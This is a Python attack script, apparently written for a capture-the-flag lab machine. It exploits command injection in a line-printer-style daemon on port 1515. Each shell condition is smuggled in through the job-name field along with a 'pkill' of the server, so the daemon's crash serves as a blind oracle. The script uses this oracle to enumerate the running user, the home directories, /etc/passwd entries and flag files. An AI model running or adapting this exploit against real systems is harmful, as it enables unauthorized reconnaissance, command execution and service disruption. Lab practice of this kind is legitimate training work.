#!/usr/bin/env python3
"""Faster oracle enumeration using batched checks and binary search."""
import socket, time, sys

T = '10.129.38.158'

def lpd(jn, t=8):
    s=socket.socket();s.settimeout(t)
    try:
        s.connect((T,1515));s.send(b'\x02archive_intake')
        time.sleep(0.1);s.recv(1024)
        ct=(f'J{jn}\n').encode()
        s.send(b'\x01\x00\x00\x00\n'+str(len(ct)).encode()+b'\n'+ct)
        time.sleep(0.2);s.recv(4096)
    except: pass
    finally: s.close()

def alive():
    s=socket.socket();s.settimeout(2)
    try:
        s.connect((T,1515));s.send(b'\x03');d=s.recv(4096);s.close();return True
    except: return False

def kill_if(condition):
    """Inject: if condition is true, kill daemon. Returns True if killed."""
    lpd(f"';{condition} && pkill -f server.py;echo '")
    time.sleep(0.2)
    a = alive()
    if not a:
        for _ in range(30):
            time.sleep(0.3)
            if alive(): break
        return True
    return False

def batch_find(items, check_func, label="items"):
    """Use binary search to find which items match a condition."""
    if len(items) <= 1:
        return items if items else []
    
    mid = len(items) // 2
    left, right = items[:mid], items[mid:]
    
    # Check left half
    if kill_if(check_func(left)):
        rest = batch_find(left, check_func, label)
        # Check right half independently
        if kill_if(check_func(right)):
            rest += batch_find(right, check_func, label)
        return rest
    elif kill_if(check_func(right)):
        return batch_find(right, check_func, label)
    return []

# Find user daemon runs as
print("=== Finding daemon user ===", flush=True)
users = ['lp', 'nobody', 'daemon', 'www', 'www-data', 'lpd', 'archive', 'printer', 'spool', 'sys', 'root', 'bin', 'mail', 'news', 'uucp', 'man', 'games', 'gopher']
for u in users:
    if kill_if(f'[ \"$(whoami)\" = \"{u}\" ]'):
        print(f'  Daemon user: {u}', flush=True)
        break

# Find home directories
print("\n=== Finding home directories ===", flush=True)
for u in users:
    if kill_if(f'test -d /home/{u}'):
        print(f'  /home/{u}: EXISTS', flush=True)
        if kill_if(f'test -f /home/{u}/user.txt'):
            print(f'  *** /home/{u}/user.txt: FOUND! ***', flush=True)
        if kill_if(f'test -f /home/{u}/flag.txt'):
            print(f'  *** /home/{u}/flag.txt: FOUND! ***', flush=True)
        if kill_if(f'test -f /home/{u}/flag'):
            print(f'  *** /home/{u}/flag: FOUND! ***', flush=True)
    time.sleep(0.1)

# Check /etc/passwd for users with login shells
print("\n=== Checking users with login shells ===", flush=True)
for u in users:
    if kill_if(f'grep -q \"^{u}:\" /etc/passwd'):
        print(f'  {u}: in /etc/passwd', flush=True)
    time.sleep(0.05)

# Check /opt and /srv
print("\n=== Checking additional dirs ===", flush=True)
for d in ['/opt', '/srv', '/var/www', '/usr/local', '/mnt', '/media']:
    if kill_if(f'test -d {d}'):
        print(f'  {d}: EXISTS', flush=True)
    time.sleep(0.1)

# Check for flag at root level more broadly
print("\n=== Root-level flag search ===", flush=True)
for f in ['/user.txt', '/flag.txt', '/flag', '/root/root.txt', '/root/flag.txt', '/tmp/flag', '/tmp/user.txt', '/root/user.txt']:
    if kill_if(f'test -f {f}'):
        print(f'  {f}: EXISTS', flush=True)

print("\n=== Enumeration complete ===", flush=True)
